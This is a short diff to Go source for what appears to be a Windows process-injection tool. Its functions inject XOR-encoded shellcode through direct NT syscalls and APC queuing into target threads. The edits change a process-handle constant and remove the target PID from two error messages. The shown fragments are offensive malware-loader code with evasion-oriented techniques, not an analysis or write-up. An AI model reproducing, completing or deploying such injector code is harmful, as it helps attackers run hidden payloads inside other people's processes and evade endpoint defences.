@@ -138,7 +138,7 @@ func (w *windowsSyscallInjector) injectCT(shellcode []byte) error {
 		return fmt.Errorf("XOR encoding failed: %w", err)
 	}
 
-	currentProcess := uintptr(0xFFFFFFFFFFFFFFFF)
+	currentProcess := ^uintptr(0)
 
 	// 2. NtAllocateVirtualMemory (PAGE_READWRITE)
 	var baseAddr uintptr
@@ -241,7 +241,7 @@ func (w *windowsSyscallInjector) injectAPC(shellcode []byte) error {
 		return fmt.Errorf("failed to find threads: %w", err)
 	}
 	if len(threadIDs) == 0 {
-		return fmt.Errorf("no threads found for PID %d", w.config.PID)
+		return fmt.Errorf("no threads found for target process")
 	}
 
 	success := false
@@ -530,7 +530,7 @@ func (w *windowsSyscallInjector) injectNtQueueApcThreadEx(shellcode []byte) erro
 		return fmt.Errorf("failed to find threads: %w", err)
 	}
 	if len(threadIDs) == 0 {
-		return fmt.Errorf("no threads found for PID %d", w.config.PID)
+		return fmt.Errorf("no threads found for target process")
 	}
 
 	success := false
